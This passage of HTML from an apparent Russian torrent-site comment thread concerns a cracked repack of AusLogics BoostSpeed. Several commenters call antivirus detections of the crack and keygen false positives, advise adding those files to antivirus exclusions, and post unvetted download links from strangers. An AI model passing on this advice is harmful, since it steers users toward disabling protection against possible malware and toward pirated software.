+При перекачке пишет уже торрент что файл содержит вирус.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Jalok</b></td> <td>09-05-2017 14:44:41 (12 месяца назад)</td> <td></td> <td align="right"><span id="c_2991433"></span><script type="text/javascript">cOptions(372664,2991433);</script></td></tr><tr><td class="c_t" colspan=4>Kerish Doctor 2017-Вот это то что надо!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>DEMON7137</b></td> <td>25-04-2017 2:20:40 (13 месяца назад)</td> <td>Оценил на: <b>1</b></td> <td align="right"><span id="c_2982819"></span><script type="text/javascript">cOptions(497896,2982819);</script></td></tr><tr><td class="c_t" colspan=4>Косяк с репаком:не работает дефрагментатор реестра!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sash8005</b></td> <td>18-02-2017 2:16:43 (15 месяцев назад)</td> <td></td> <td align="right"><span id="c_2939337"></span><script type="text/javascript">cOptions(1040270,2939337);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br /><b>Rekukler</b><br />
+Согласен с ниже подписавшимся , RegOrganizer лучшая из подобных программ , ничего лишнего и все работает. За раздачу спасибо . свох почитателей она найдет</fieldset><br />
+согласен с нижесогласившимися, РегОрганайзер на порядок полезнее, а последние версии БустСпида - в топку.. </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Rekukler</b></td> <td>17-02-2017 9:23:48 (15 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2938767"></span><script type="text/javascript">cOptions(1002727,2938767);</script></td></tr><tr><td class="c_t" colspan=4>Согласен  с  ниже подписавшимся , RegOrganizer лучшая из  подобных  программ ,  ничего  лишнего и все  работает. За раздачу спасибо . свох  почитателей она найдет</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>jass-funk</b></td> <td>17-02-2017 8:48:57 (15 месяцев назад)</td> <td></td> <td align="right"><span id="c_2938757"></span><script type="text/javascript">cOptions(1473968,2938757);</script></td></tr><tr><td class="c_t" colspan=4>ничем не удивила. мало того не обнаружил браузера в системе 0_0. удалил. останусь пока с РегОрганайзер</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Гамер</b></td> <td>13-02-2017 20:19:03 (15 месяцев назад)</td> <td></td> <td align="right"><span id="c_2936528"></span><script type="text/javascript">cOptions(1162471,2936528);</script></td></tr><tr><td class="c_t" colspan=4>выскакивает постоянно при запуске окошко &quot;ошибка запуска приложения 0x0000022&quot;</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>andresweet</b></td> <td>09-02-2017 22:50:38 (15 месяцев назад)</td> <td></td> <td align="right"><span id="c_2933798"></span><script type="text/javascript">cOptions(694959,2933798);</script></td></tr><tr><td class="c_t" colspan=4>Win 7 max x64 - не запустился ни один из вариантов, включая установочный.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Рамзан</b></td> <td>19-01-2017 8:47:36 (16 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2918132"></span><script type="text/javascript">cOptions(1476432,2918132);</script></td></tr><tr><td class="c_t" colspan=4>Раздающему РАХМАТ! </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Keeneclipse</b></td> <td>21-12-2016 17:48:27 (17 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2899592"></span><script type="text/javascript">cOptions(698961,2899592);</script></td></tr><tr><td class="c_t" colspan=4>Отличная программа! Спасибо раздающему!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>smersch</b></td> <td>21-12-2016 14:56:03 (17 месяцев назад)</td> <td></td> <td align="right"><span id="c_2899494"></span><script type="text/javascript">cOptions(1213616,2899494);</script></td></tr><tr><td class="c_t" colspan=4>не работает нормально,даже привычную дефраментацию не смог сделать на этой версии,перешёл на  его клон TweakBit PCSuite,чего и вам желаю</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Алекс49</b></td> <td>21-12-2016 13:12:00 (17 месяцев назад)</td> <td></td> <td align="right"><span id="c_2899444"></span><script type="text/javascript">cOptions(1194307,2899444);</script></td></tr><tr><td class="c_t" colspan=4>     Спасибо за обновления.Пользуюсь версией 9.0.0.там работает все.Главное есть телефон для связи,в версиях 9.1 и выше интерфейс упростился.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Serega_TLT</b></td> <td>09-12-2016 0:30:37 (17 месяцев назад)</td> <td></td> <td align="right"><span id="c_2891519"></span><script type="text/javascript">cOptions(849031,2891519);</script></td></tr><tr><td class="c_t" colspan=4>Task Manager не отвечает(не запускается)</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Гамер</b></td> <td>30-11-2016 19:15:55 (17 месяцев назад)</td> <td></td> <td align="right"><span id="c_2886088"></span><script type="text/javascript">cOptions(1162471,2886088);</script></td></tr><tr><td class="c_t" colspan=4>вот тожде зачем стока головоломок в установке?какую устанавливать то &quot;установочную или портативную&quot;?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Гамер</b></td> <td>30-11-2016 8:29:15 (17 месяцев назад)</td> <td></td> <td align="right"><span id="c_2885665"></span><script type="text/javascript">cOptions(1162471,2885665);</script></td></tr><tr><td class="c_t" colspan=4>та же самая ошибка что и у Ричмонд Черри.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Ричмонд Черри</b></td> <td>29-11-2016 11:03:58 (18 месяцев назад)</td> <td></td> <td align="right"><span id="c_2885028"></span><script type="text/javascript">cOptions(1450419,2885028);</script></td></tr><tr><td class="c_t" colspan=4><div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">Скрытый текст</div><div class="hidebody"></div><textarea class="hidearea"><img src="http://i85.fastpic.ru/big/2016/1129/89/dcff22b48318606cb4081a3261411889.png" /></textarea></div><br />
+Не запускается:(<br />
+Ставил через &quot;тихую&quot;<br />
+WTF!?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Христофоr</b></td> <td>26-11-2016 21:33:30 (18 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2883498"></span><script type="text/javascript">cOptions(1466565,2883498);</script></td></tr><tr><td class="c_t" colspan=4>Domino, спасибо, нет ли Advanced SistemCar посвежее(8-ки).</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Алекс49</b></td> <td>26-11-2016 14:09:43 (18 месяцев назад)</td> <td></td> <td align="right"><span id="c_2883220"></span><script type="text/javascript">cOptions(1194307,2883220);</script></td></tr><tr><td class="c_t" colspan=4>      Спасибо за портативку,на старую версию не встал А так работает и заметна разница с 9 ровно.Ни каких ложных срабатываний не было.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Ричмонд Черри</b></td> <td>24-11-2016 21:22:07 (18 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2882170"></span><script type="text/javascript">cOptions(1450419,2882170);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />ВНИМАНИЕ!!! Возможно ЛОЖНОЕ срабатывание антивирусов на &quot;лекарство&quot; (файл SHFolder.dll).</fieldset><br />
+КИСа предложил вылечить с перезагрузкой, в итоге слетела режка.......<br />
+Переставлять буду.....<br />
+В исключения внести?<br />
+<br />
+</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>AgnosticX</b></td> <td>13-09-2016 12:36:01 (20 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2833853"></span><script type="text/javascript">cOptions(774685,2833853);</script></td></tr><tr><td class="c_t" colspan=4>WIN10, системе 2 недели, устанавливал лишь 2 браузера, 5~ игр, перенёс информацию с жесткого на ссд (200гб видео, игр, музыки, софт, драйвера), остальное время сёрфинг в инете, работа в приложениях и играх. Для очистки периодически использую CCleaner, накапливается до 1гб мусора ( из которого как правило бОльшая часть нужный кеш, частопосищаемых страниц ) <br />
+Скачал это &quot;чудо&quot;, первый запуск: 313мб мусора (5 файлов пропущено), 216 ошибок в реестре (4 проблемы пропущены), скорость ПК 155 проблем исправлено. (155 ПРОБЛЕМ, КАРЛ!)<br />
+<br />
+Реайльный плюс - подсказывает какие системные службы можно отключить из за ненадобности ( в списке СуперФетч и Индексация есть или нет не знаю - отключаю сразу после установки ОС ибо ресурсы накопителей они жрут еще как )<br />
+<br />
+Плюс сотни проблем в других местах, в основном касательно безопасности личных данных...<br />
+Какое то неоднозначное отношение к этому софту, схожее творил давно давно TuneUP, удаляя дохрена и больше, порой нужного, еще и вызывал проблемы, которых до него и не было вовсе - загружал систему как минимум.<br />
+<br />
+Дополнительно из программы установил Driver Updater.<br />
+<br />
+Понятное дело всё ставить смысла особого то и нет. Реклама всякого софта навязчивого, который на самом деле то и не нужен вовсе.<br />
+<br />
+Пока 10 - всё работает. <br />
+</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>legeonet</b></td> <td>25-07-2016 21:04:29 (22 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2803365"></span><script type="text/javascript">cOptions(108828,2803365);</script></td></tr><tr><td class="c_t" colspan=4>Помогла программа реально. Инет на ноутбуке с WIN 10  новом тупил нещадно, странички долго подгружались. После оптимизации страницы просто залетали.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Mitrey</b></td> <td>25-06-2016 10:49:54 (23 месяца назад)</td> <td></td> <td align="right"><span id="c_2787487"></span><script type="text/javascript">cOptions(1440404,2787487);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thankyou.gif" /> За чудесную сборку!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>mode80</b></td> <td>24-06-2016 19:23:11 (23 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2787214"></span><script type="text/javascript">cOptions(1301169,2787214);</script></td></tr><tr><td class="c_t" colspan=4> ЛОЖНОЕ срабатывание антивирусов на &quot;лекарство&quot; (файл SHFolder.dll).<br />
+ В моем случае Malwarebytes Anti-Malware блокировал лекарство в следствии чего прога имела статус не лицензированной. Решение - добавить файл в исключения антивирусов.<br />
+ Автору раздачи предлагаю добавить проблему в описание.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Mitrey</b></td> <td>24-06-2016 8:40:36 (23 месяца назад)</td> <td></td> <td align="right"><span id="c_2786964"></span><script type="text/javascript">cOptions(1440404,2786964);</script></td></tr><tr><td class="c_t" colspan=4>Проблема зависания при исправлении после сканирования исправлена???</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Виталик800</b></td> <td>24-06-2016 2:35:59 (23 месяца назад)</td> <td></td> <td align="right"><span id="c_2786906"></span><script type="text/javascript">cOptions(814283,2786906);</script></td></tr><tr><td class="c_t" colspan=4>Как отменить тюнинг этот вин 10 в этой проги галки не снимаются!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Lucein</b></td> <td>19-06-2016 15:55:06 (23 месяца назад)</td> <td></td> <td align="right"><span id="c_2784565"></span><script type="text/javascript">cOptions(170242,2784565);</script></td></tr><tr><td class="c_t" colspan=4>Меню &quot;Пуск&quot; больше не ломает? Закладки в браузере (Firefox) не стирает (когда &quot;приватность&quot;-&quot;исправить все&quot;)?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Mitrey</b></td> <td>16-06-2016 17:09:55 (23 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2783010"></span><script type="text/javascript">cOptions(1440404,2783010);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thankyou.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>D.J.Koks</b></td> <td>16-06-2016 0:24:09 (23 месяца назад)</td> <td></td> <td align="right"><span id="c_2782726"></span><script type="text/javascript">cOptions(90778,2782726);</script></td></tr><tr><td class="c_t" colspan=4>Как её активировать? после установки версия незарегена!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>dr-papa1966</b></td> <td>15-06-2016 14:30:58 (23 месяца назад)</td> <td></td> <td align="right"><span id="c_2782422"></span><script type="text/javascript">cOptions(363687,2782422);</script></td></tr><tr><td class="c_t" colspan=4>пользуюсь до сих пор версией 5.5.1.0 пока еще работает нормально</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Алекс49</b></td> <td>15-06-2016 10:10:18 (23 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2782321"></span><script type="text/javascript">cOptions(1194307,2782321);</script></td></tr><tr><td class="c_t" colspan=4>        Спасибо!Все работает.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>kstanay79</b></td> <td>14-06-2016 17:27:42 (23 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2782030"></span><script type="text/javascript">cOptions(1064889,2782030);</script></td></tr><tr><td class="c_t" colspan=4><b>zvuk17</b> надо было во вкладке <b>приватность</b> не жать слепо на <b>исправить все</b><br />
+а просто в отслеживаемых куках нажать на <b>подробнее</b> и снять галку с <b>хром-куки</b> или раскрыть хром-куки и в ручную выделить, что удалить нужно и уже потом жмакать исправить все</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>NeedForSpirt</b></td> <td>05-06-2016 15:58:47 (23 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2777054"></span><script type="text/javascript">cOptions(1016320,2777054);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thankyou.gif" /> <img src="http://s.rutor.info/t/smilies/bubs.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Royallock</b></td> <td>27-05-2016 4:22:02 (24 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2770949"></span><script type="text/javascript">cOptions(1039724,2770949);</script></td></tr><tr><td class="c_t" colspan=4>Народ, под каждой раздачей ауслоджика постоянно читаю, что последняя хорошая версия 5.1.0.0., объясните, чем лучше? если из-за дизайна, то ладно, но а если по работе, то скажите что с восьмыми не так? И подскажите, пятая будет работать нормально на винде 8.1?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Wonderio619</b></td> <td>08-05-2016 19:19:38 (24 месяца назад)</td> <td></td> <td align="right"><span id="c_2759965"></span><script type="text/javascript">cOptions(563402,2759965);</script></td></tr><tr><td class="c_t" colspan=4>Хм, а какой толк от обновленной цифровой подписи ?</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>-=DoMiNo=-</b></td> <td>08-05-2016 14:20:52 (24 месяца назад)</td> <td></td> <td align="right"><span id="c_2759742"></span><script type="text/javascript">cOptions(805410,2759742);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />Что означает DC 26.04.2016 ?</fieldset><br />
+<br />
+<b>Версия</b> с цифровой подписью от 26.04.2016</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Wonderio619</b></td> <td>08-05-2016 12:11:14 (24 месяца назад)</td> <td></td> <td align="right"><span id="c_2759657"></span><script type="text/javascript">cOptions(563402,2759657);</script></td></tr><tr><td class="c_t" colspan=4>Что означает <b>DC 26.04.2016</b> ?<br />
+Ребятам ниже: 5 версия конечно была огонь, но ведь она давно устарела. Я бы не рисковал ею проводить серьёзные манипуляции над виндой.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>klaasgo</b></td> <td>08-05-2016 10:06:52 (24 месяца назад)</td> <td></td> <td align="right"><span id="c_2759569"></span><script type="text/javascript">cOptions(469958,2759569);</script></td></tr><tr><td class="c_t" colspan=4>5.5.1.0</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>klim1891</b></td> <td>07-03-2016 17:51:26 (26 месяцев назад)</td> <td></td> <td align="right"><span id="c_2717937"></span><script type="text/javascript">cOptions(739584,2717937);</script></td></tr><tr><td class="c_t" colspan=4>AusLogics BoostSpeed 5.5.1.0 - лучшая версия !!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>grig`s</b></td> <td>06-03-2016 18:47:51 (26 месяцев назад)</td> <td></td> <td align="right"><span id="c_2717341"></span><script type="text/javascript">cOptions(163249,2717341);</script></td></tr><tr><td class="c_t" colspan=4>перепробовал все-вернулся на 5.5.0.0 <img src="http://s.rutor.info/t/smilies/relax.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>MOSLG</b></td> <td>06-03-2016 18:13:48 (26 месяцев назад)</td> <td></td> <td align="right"><span id="c_2717315"></span><script type="text/javascript">cOptions(674536,2717315);</script></td></tr><tr><td class="c_t" colspan=4>Уважаемый <b>-=DoMiNo=-</b>, а 5ю версию только по сборникам искать?<br />
+ Я тут нашёл <b>5.5.1</b> — <a href="http://new-tor.org/torrent/460401/cowboy-wpi-dvd-startsoft-68-2015-2015-pc" target="_blank">http://new-tor.org/torrent/460401/cowboy-wpi-dvd-startsoft-68-2015-2015-pc</a></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Fantic86</b></td> <td>29-02-2016 20:00:26 (27 месяцев назад)</td> <td></td> <td align="right"><span id="c_2713552"></span><script type="text/javascript">cOptions(645692,2713552);</script></td></tr><tr><td class="c_t" colspan=4>5 версия была лучше всех </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>cпартак</b></td> <td>19-11-2015 21:26:13 (30 месяцев назад)</td> <td></td> <td align="right"><span id="c_2633718"></span><script type="text/javascript">cOptions(878175,2633718);</script></td></tr><tr><td class="c_t" colspan=4>Эффект плацебо(«пустышка»), пользы ноль, а на душе приятно))</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>tabex</b></td> <td>19-11-2015 21:18:07 (30 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2633704"></span><script type="text/javascript">cOptions(453992,2633704);</script></td></tr><tr><td class="c_t" colspan=4><b>djromich</b>я с тобой не соглашусь не уверен в других подобных но AusLogics полезная софтина, твики выполняет исправно сам проверял, раньше делал все ручками в реестре менял настройки Disk Defrag тоже очень хорош, единственное не нравится что прикрутили авто оптимизацию вы скажите дак v5.5.1.0 но я склоняюсь новее значит лучше. </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>djromich</b></td> <td>19-11-2015 18:29:29 (30 месяцев назад)</td> <td></td> <td align="right"><span id="c_2633488"></span><script type="text/javascript">cOptions(6688,2633488);</script></td></tr><tr><td class="c_t" colspan=4>вин 10 сама чистит реестр.вообще это псевдо улучшалки создают иллюзию что что-то оптимизируют)))</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>boxMustang</b></td> <td>18-11-2015 13:39:25 (30 месяцев назад)</td> <td>Оценил на: <b>8</b></td> <td align="right"><span id="c_2632183"></span><script type="text/javascript">cOptions(1292356,2632183);</script></td></tr><tr><td class="c_t" colspan=4>Все в ажуре,установил прогу,поремонтировал систему,удалил)))))</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Projack63</b></td> <td>16-11-2015 21:27:09 (30 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2630706"></span><script type="text/javascript">cOptions(1415623,2630706);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо. Все просто. Все работает. Win 8.1</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>-=DoMiNo=-</b></td> <td>06-11-2015 16:20:44 (30 месяцев назад)</td> <td></td> <td align="right"><span id="c_2619163"></span><script type="text/javascript">cOptions(805410,2619163);</script></td></tr><tr><td class="c_t" colspan=4><fieldset style="border: 1px dashed black;"><legend>Цитата</legend><b>Кто-то</b> писал:<br />m951</fieldset> - раздача архивов и темболее запароленных - запрещена политикой трекера))</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>m951</b></td> <td>06-11-2015 9:32:17 (30 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2618862"></span><script type="text/javascript">cOptions(235264,2618862);</script></td></tr><tr><td class="c_t" colspan=4>AVG антивирус пытается удалить кейген. Прошу раздатчика учесть это в будущем и принять меры, чтобы такого не происходило. Например, заархивировать кейген с паролем.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>SergNT</b></td> <td>05-11-2015 16:12:10 (31 месяц назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2618234"></span><script type="text/javascript">cOptions(49193,2618234);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>Palintin</b></td> <td>28-10-2015 0:24:47 (31 месяц назад)</td> <td>Оценил на: <b>6</b></td> <td align="right"><span id="c_2610753"></span><script type="text/javascript">cOptions(768782,2610753);</script></td></tr><tr><td class="c_t" colspan=4>Так намного лучше, третий снизу помог. Антивирус ругался люто. Даже когда игнорируешь угрозу продолжал блокировать генератор. AVG.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>slava_tx</b></td> <td>26-10-2015 7:26:09 (31 месяц назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2609324"></span><script type="text/javascript">cOptions(1233045,2609324);</script></td></tr><tr><td class="c_t" colspan=4>на Windows 10 сыровата эта программа это уж точно...может в следующих версиях допилят тогда как говорят под &#039;&#039;пиво с рыбкой&#039;&#039; и пойдёт на этой &#039;&#039;нежной системе&#039;&#039;( нет 10-ка она отличная если руки прямые - то вообще зачёт) просто ещё сыроватый софт под неё) пользуюсь на 8-ке нареканий нету) очень уж иногда помогает чистить систему когда наступают приступы лени... и да &#039;&#039;руторчане&#039;&#039; <div class="hidewrap"><div class="hidehead" onclick="hideshow($(this))">секрет</div><div class="hidebody"></div><textarea class="hidearea">все хорошо знают стандартную чистилку мусора cleanmgr ? если прочитали то у меня для вас подарок от человека со стажем в работе компов(не хвалюсь просто 10 лет занимаюсь всего навсего 10 лет..) вообщем обычная &#039;&#039;очистка диска&#039;&#039; но с &#039;&#039;расширенными параметрами&#039;&#039; очистки мусора)) забирайте) рекомендую чистить систему) может и до меня многие знали просто не в службу а в дружбу)) пара советов) <a href="http://sendfile.su/1168156" target="_blank">http://sendfile.su/1168156</a><br />
+и система станет быстрее)<br />
+Спасибо рутору за всё)) хороший сайт всегда в закладки! Всем добра и бобра! и никакого зла!)</textarea></div> </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>A56152</b></td> <td>25-10-2015 23:40:57 (31 месяц назад)</td> <td></td> <td align="right"><span id="c_2609199"></span><script type="text/javascript">cOptions(784965,2609199);</script></td></tr><tr><td class="c_t" colspan=4>отличная утилита давно такои пользуюсь<br />
+</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>sapiens86</b></td> <td>25-10-2015 16:11:29 (31 месяц назад)</td> <td></td> <td align="right"><span id="c_2608834"></span><script type="text/javascript">cOptions(1403375,2608834);</script></td></tr><tr><td class="c_t" colspan=4>..на win 10 эта прога  сносит (при очистке реестра) меню ПУСК и Центр уведомлений (перестают работать)..на Win 8.1 ,7 все нормально..</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>tumsotu</b></td> <td>25-10-2015 14:23:44 (31 месяц назад)</td> <td></td> <td align="right"><span id="c_2608741"></span><script type="text/javascript">cOptions(205399,2608741);</script></td></tr><tr><td class="c_t" colspan=4>ждём portable <img src="http://s.rutor.info/t/smilies/glad.gif" /></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>побелка</b></td> <td>25-10-2015 11:39:14 (31 месяц назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2608607"></span><script type="text/javascript">cOptions(374781,2608607);</script></td></tr><tr><td class="c_t" colspan=4>Все прошло как по маслу!Автору Спасибо </td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>асгард</b></td> <td>25-10-2015 9:16:53 (31 месяц назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2608523"></span><script type="text/javascript">cOptions(828504,2608523);</script></td></tr><tr><td class="c_t" colspan=4><img src="http://s.rutor.info/t/smilies/thankyou.gif" /> -=DoMiNo=-</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>HolyRoller</b></td> <td>01-09-2015 6:27:54 (33 месяца назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2565134"></span><script type="text/javascript">cOptions(1200337,2565134);</script></td></tr><tr><td class="c_t" colspan=4>Знатный репачёк,раздающему уважуха!!!!</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>MrOxxxymiron</b></td> <td>24-06-2015 7:56:23 (35 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2515606"></span><script type="text/javascript">cOptions(1336158,2515606);</script></td></tr><tr><td class="c_t" colspan=4>Отличный получился RePack !!!!!!!!!!!!! ждём релиза AusLogics BoostSpeed Premium 8.</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>death8</b></td> <td>30-05-2015 14:53:38 (36 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2499363"></span><script type="text/javascript">cOptions(822210,2499363);</script></td></tr><tr><td class="c_t" colspan=4>Спасибо )</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>gurkin4</b></td> <td>16-05-2015 18:20:02 (36 месяцев назад)</td> <td></td> <td align="right"><span id="c_2487001"></span><script type="text/javascript">cOptions(109116,2487001);</script></td></tr><tr><td class="c_t" colspan=4>Пользуюсь до сих пор версией 5.0.6.245, работает отлично!<br />
+Нафига нужно что-то новое?<br />
+Прямая ссылка:<br />
+<a href="http://fzag.libmoikvzb.ru/A.BoostSpeed_7.9.0.0_rus.rar" target="_blank">http://fzag.libmoikvzb.ru/A.BoostSpeed_7.9.0.0_rus.rar</a></td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>shpion25</b></td> <td>11-05-2015 15:36:46 (36 месяцев назад)</td> <td></td> <td align="right"><span id="c_2482148"></span><script type="text/javascript">cOptions(393183,2482148);</script></td></tr><tr><td class="c_t" colspan=4>по мне последняя нормальная версия это 5.5.1.0 а начиная с 6 шлак какой-то</td></tr><tr><td colspan="4">&nbsp;</td></tr><tr class="c_h"><td><b>toskana</b></td> <td>22-04-2015 11:19:15 (37 месяцев назад)</td> <td>Оценил на: <b>10</b></td> <td align="right"><span id="c_2459248"></span><script type="text/javascript">cOptions(1240772,2459248);</script></td></tr><tr><td class="c_t" colspan=4>Нормальный Бутспид, работает нормально, всем спасибо)</td></tr><tr><td colspan="4">&nbsp;</td></tr></table>
+<center><a href="#up"><img src="http://s.rutor.info/t/top.gif" alt="up" /></a></center>
+
+<!-- bottom banner -->
+
+<div id="down">
+Файлы для обмена предоставлены пользователями сайта. Администрация не несёт ответственности за их содержание.
+На сервере хранятся только торрент-файлы. Это значит, что мы не храним никаких нелегальных материалов. <a href="/advertise.php">Реклама</a>. 
+</div>
+
+
+</div>
+
+<div id="sidebar">
+
+<div class="sideblock">
+	<a id="fforum" href="/torrent/145012"><img src="http://s.rutor.info/i/forum.gif" alt="forum" /></a>
+</div>
+
+<div class="sideblock">
+<center>
+<table border="0" background="http://s.rutor.info/i/poisk_bg.gif" cellspacing="0" cellpadding="0" width="100%" height="56px">
+<script type="text/javascript">function search_sidebar() { window.location.href = '/search/'+$('#in').val(); return false; }</script>
+<form action="/b.php" method="get" onsubmit="return search_sidebar();">
+ <tr>
+  <td scope="col" rowspan=2><img src="http://s.rutor.info/i/lupa.gif" border="0" alt="img" /></td>
+  <td valign="middle"><input type="text" name="search" size="18" id="in"></td>
+ </tr>
+ <tr>
+  <td><input name="submit" type="submit" id="sub" value="искать по названию"></td>
+ </tr>
+</form>
+</table>
+</center>
+</div>
+
+
+
+<div class="sideblock2">
+<center>
+<div id="b_bn_51" onmouseup="window.event.cancelBubble=true"></div>
+<script>(function(){var s=document.createElement('script');s.src='http://tredman.com/j/w.php?id=51&r='+Math.random();document.getElementsByTagName('head')[0].appendChild(s)})();</script>
+</center>
+</div>
+
+<div class="sideblock2">
+<!--LiveInternet counter--><script type="text/javascript"><!--
+document.write("<a href='http://www.liveinternet.ru/click' "+
+"target=_blank><img src='http://counter.yadro.ru/hit?t39.6;r"+
+escape(document.referrer)+((typeof(screen)=="undefined")?"":
+";s"+screen.width+"*"+screen.height+"*"+(screen.colorDepth?
+screen.colorDepth:screen.pixelDepth))+";u"+escape(document.URL)+
+";"+Math.random()+
+"' alt='' title='LiveInternet' "+
+"border=0 width=31 height=31><\/a>")//--></script><!--/LiveInternet-->
+</div>
+
+</div>
+
+</div>
+
+
+
+<script type="text/javascript">
+ (function () {
